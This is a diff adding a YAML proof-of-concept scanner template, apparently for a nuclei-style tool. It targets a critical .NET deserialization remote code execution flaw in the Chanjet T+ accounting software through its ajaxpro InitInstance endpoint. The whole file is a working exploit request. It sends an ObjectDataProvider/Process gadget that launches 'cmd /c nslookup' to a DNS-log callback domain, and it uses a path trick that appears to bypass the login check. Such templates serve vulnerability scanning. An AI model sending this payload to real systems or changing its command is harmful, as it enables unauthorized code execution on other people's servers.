@@ -1,0 +1,27 @@
+id: poc-yaml-changjie-tplus-app-code-Initinstance-rce
+info:
+  name: 畅捷通T+ME_MemberIntegral_IntegralAdjust,App_Code.ashx?method=InitInstance 反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - 反序列化
+  finger: 畅捷通T+
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.CodeBehind.DR.Member.MemberIntegral.ME_MemberIntegral_IntegralAdjust,App_Code.ashx?method=InitInstance/;/login
+  headers:
+    X-Ajaxpro-Method: InitInstance
+  data: "{\n  \"arges\":{\n    \"__type\":\"System.Windows.Data.ObjectDataProvider,\
+    \ PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\"\
+    ,\n    \"MethodName\":\"Start\",\n    \"ObjectInstance\":{\n      \"__type\":\"\
+    System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\
+    ,\n      \"StartInfo\": {\n        \"__type\":\"System.Diagnostics.ProcessStartInfo,\
+    \ System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\
+    ,\n        \"FileName\":\"cmd\", \"Arguments\":\"/c nslookup {{.reverseDomain}}\"\
+    \n      }\n    }\n  }\n}\n"
+  expression: reverse.Verify()
+transport: http
